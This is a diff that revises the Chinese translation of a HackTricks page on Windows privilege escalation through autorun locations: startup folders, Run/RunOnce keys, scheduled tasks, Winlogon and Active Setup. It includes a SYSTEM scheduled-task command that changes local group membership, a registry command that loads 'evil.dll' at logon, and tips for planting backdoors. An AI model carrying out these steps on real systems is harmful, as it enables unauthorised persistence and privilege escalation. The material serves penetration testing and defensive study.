@@ -1,35 +1,35 @@
-# 使用自启动程序的权限提升
+# 使用 Autoruns 的权限提升
 
 <details>
 
-<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>
+<summary><strong>从零到英雄学习 AWS 黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>
 
-支持HackTricks的其他方式：
+支持 HackTricks 的其他方式：
 
-* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧。
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-如果您对**黑客职业**感兴趣，并且想要黑入不可黑的系统 - **我们正在招聘！** (_需要流利的波兰语书写和口语_).
+如果您对**黑客职业**感兴趣，并且想要黑入不可黑入的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 ## WMIC
 
-**Wmic** 可以用来在**启动时**运行程序。使用以下命令查看哪些二进制文件被设置为启动时运行：
+**Wmic** 可以用来在**启动时**运行程序。使用以下命令查看哪些二进制文件被安排在启动时运行：
 ```bash
 wmic startup get caption,command 2>nul & ^
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 ```
 ## 计划任务
 
-**任务**可以设置为**一定频率**运行。查看哪些二进制文件被计划运行，请使用：
+**任务**可以设置为**一定频率**运行。查看哪些二进制文件被安排运行，请使用：
 ```bash
 schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
 schtasks /query /fo LIST 2>nul | findstr TaskName
@@ -42,7 +42,7 @@ schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgro
 ```
 ## 文件夹
 
-所有位于**启动文件夹中的二进制文件将在启动时执行**。常见的启动文件夹如下所列，但启动文件夹的位置在注册表中指明。[阅读此内容以了解位置。](privilege-escalation-with-autorun-binaries.md#startup-path)
+所有位于**启动文件夹中的二进制文件将在启动时执行**。常见的启动文件夹如下所列，但启动文件夹的位置在注册表中指明。[阅读此内容以了解具体位置。](privilege-escalation-with-autorun-binaries.md#startup-path)
 ```bash
 dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
 dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
@@ -54,7 +54,7 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 ## 注册表
 
 {% hint style="info" %}
-注意：**Wow6432Node** 注册表项表明你正在运行一个 64 位的 Windows 版本。操作系统使用这个键为在 64 位 Windows 版本上运行的 32 位应用程序显示 HKEY_LOCAL_MACHINE\SOFTWARE 的独立视图。
+注意：**Wow6432Node** 注册表项表明你正在运行一个64位的Windows版本。操作系统使用这个键为在64位Windows版本上运行的32位应用程序显示HKEY\_LOCAL\_MACHINE\SOFTWARE的独立视图。
 {% endhint %}
 
 ### 运行
@@ -73,7 +73,7 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 * `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
 * `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`
 
-Run 和 RunOnce 注册表键会导致程序在每次用户登录时运行。键的数据值是不超过 260 个字符的命令行。
+Run 和 RunOnce 注册表键会导致程序在每次用户登录时运行。键的数据值是一个不超过260个字符的命令行。
 
 **服务运行**（可以控制服务在启动时的自动启动）：
 
@@ -91,14 +91,14 @@ Run 和 RunOnce 注册表键会导致程序在每次用户登录时运行。键�
 * `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
 * `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`
 
-在 Windows Vista 及更新版本上默认不会创建。注册表运行键条目可以直接引用程序或将它们列为依赖项。例如，可以使用 RunOnceEx 的 "Depend" 键在登录时加载 DLL：`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`
+在Windows Vista及更新版本上默认不会创建。注册表运行键条目可以直接引用程序或将它们列为依赖项。例如，可以使用RunOnceEx的"Depend"键在登录时加载DLL：`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`
 
 {% hint style="info" %}
-**利用 1**：如果你能写入 **HKLM** 中提到的任何注册表，当不同用户登录时，你可以提升权限。
+**利用1**：如果你可以在**HKLM**中提到的任何注册表内写入，当不同用户登录时你可以提升权限。
 {% endhint %}
 
 {% hint style="info" %}
-**利用 2**：如果你能覆盖 **HKLM** 内任何注册表中指示的任何二进制文件，当不同用户登录时，你可以修改该二进制文件并植入后门来提升权限。
+**利用2**：如果你可以覆盖在**HKLM**内任何注册表中指示的任何二进制文件，当不同用户登录时你可以修改那个带有后门的二进制文件并提升权限。
 {% endhint %}
 ```bash
 #CMD
@@ -162,7 +162,7 @@ Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\Ru
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
 
-任何创建到由子键 Startup 指向的位置的快捷方式将在登录/重启时启动服务。启动位置在本地机器和当前用户下都有指定。
+任何创建到由子键 Startup 指向的位置的快捷方式将在登录/重启时启动服务。启动位置在本地机器和当前用户都有指定。
 
 {% hint style="info" %}
 如果你能覆盖 **HKLM** 下的任何 \[User] Shell Folder，你将能够将其指向一个由你控制的文件夹，并放置一个后门，每当用户登录系统时都会执行，从而提升权限。
@@ -182,8 +182,8 @@ Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
 
 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
 
-通常，**Userinit** 密钥指向 userinit.exe，但如果这个密钥可以被更改，那么该 exe 也会被 Winlogon 启动。\
-**Shell** 密钥应该指向 explorer.exe。
+通常，**Userinit** 键指向 userinit.exe，但如果这个键可以被更改，那么该 exe 也将由 Winlogon 启动。\
+**Shell** 键应该指向 explorer.exe。
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
@@ -191,7 +191,7 @@ Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVers
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
 ```
 {% hint style="info" %}
-如果您能够覆盖注册表值或二进制文件，您将能够提升权限。
+如果您能够重写注册表值或二进制文件，您将能够提升权限。
 {% endhint %}
 
 ### 策略设置
@@ -243,7 +243,7 @@ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Co
 * `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
 * `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
 
-Active Setup 在桌面出现之前运行。由 Active Setup 启动的命令同步执行，执行时会阻塞登录。在任何 Run 或 RunOnce 注册表条目被评估之前，都会执行 Active Setup。
+Active Setup 在桌面出现之前运行。由 Active Setup 启动的命令同步执行，执行时会阻塞登录。Active Setup 在任何 Run 或 RunOnce 注册表条目被评估之前执行。
 
 在这些键中，你会找到更多的键，每个键都包含一些有趣的键值对。最有趣的是：
 
@@ -255,7 +255,7 @@ Active Setup 在桌面出现之前运行。由 Active Setup 启动的命令同�
 * 如果 Active Setup 确定在登录期间需要运行此组件，将执行此命令。
 
 {% hint style="info" %}
-如果你能够写入/覆盖任何 _**IsInstalled == "1"**_ 的键的 **StubPath** 键，你可以将其指向一个后门并提升权限。同样，如果你能够覆盖任何 **StubPath** 键指向的任何 **binary**，你也能够提升权限。
+如果你能够写入/覆盖任何 _**IsInstalled == "1"**_ 的键的 **StubPath** 键，你可以将其指向一个后门并提升权限。同样，如果你能够覆盖任何 **StubPath** 键指向的任何 **二进制文件**，你也能够提升权限。
 {% endhint %}
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
@@ -309,7 +309,7 @@ HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Executi
 ```
 ## SysInternals
 
-请注意，所有可以找到自启动项的网站**已经被**[**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)**搜索过了**。然而，为了获取**更全面的自动执行文件列表**，你可以使用来自systinternals的[autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)：
+请注意，所有可以找到自启动项的地方**已经被**[**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)**搜索过了**。然而，为了获取**更全面的自动执行文件列表**，你可以使用来自systinternals的[autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)：
 ```
 autorunsc.exe -m -nobanner -a * -ct /accepteula
 ```
@@ -323,7 +323,7 @@ autorunsc.exe -m -nobanner -a * -ct /accepteula
 * [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
 * [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
 如果你对**黑客职业**感兴趣，并且想要黑进那些不可黑的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。
 
@@ -336,9 +336,9 @@ autorunsc.exe -m -nobanner -a * -ct /accepteula
 支持HackTricks的其他方式：
 
 * 如果你想在**HackTricks上看到你的公司广告**或者**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
 * 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
 * **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧**。
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧。
 
 </details>
